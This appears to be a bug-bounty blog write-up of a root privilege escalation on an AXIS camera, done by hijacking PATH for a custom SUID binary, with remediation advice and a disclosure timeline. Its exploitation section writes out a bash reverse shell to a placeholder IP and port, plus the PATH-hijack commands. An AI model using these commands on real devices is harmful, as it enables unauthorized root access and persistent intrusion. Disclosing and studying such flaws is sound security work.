---
layout: post
title: "AXIS OS: Privilege Escalation via Custom SUID Binary"
date: 2025-12-14
categories: [Bug Bounty]
tags: [privesc, suid, linux, bugbounty, axis]
---

After gaining initial SSH access to an AXIS camera device through the [Bugcrowd AXIS OS program](/posts/axis-bac-cwe862), the next step was enumerating privilege escalation vectors.

## Reconnaissance

Start with a full SUID binary scan:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Among the standard binaries (`/usr/bin/sudo`, `/bin/su`, etc.), one stood out immediately — a custom binary at a non-standard path belonging to the AXIS firmware stack.

## Analysis

Running `strings` against the binary revealed it called `system()` with a relative path — a textbook PATH hijack opportunity.

```bash
strings /path/to/suid-binary | grep -E "system|exec|popen"
```

## Exploitation

Create a malicious binary with the same name earlier in `$PATH`:

```bash
echo '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1' > /tmp/target-binary
chmod +x /tmp/target-binary
export PATH=/tmp:$PATH
./suid-binary
```

## Impact

Full root shell on the device, enabling persistent access and access to credentials stored in protected memory regions.

## Remediation

The vendor should use absolute paths in `system()` calls and audit all custom SUID binaries in the firmware.

## Timeline

| Date | Event |
|------|-------|
| 2025-11-28 | Initial discovery |
| 2025-12-01 | Reported via Bugcrowd |
| 2025-12-14 | Writeup published |
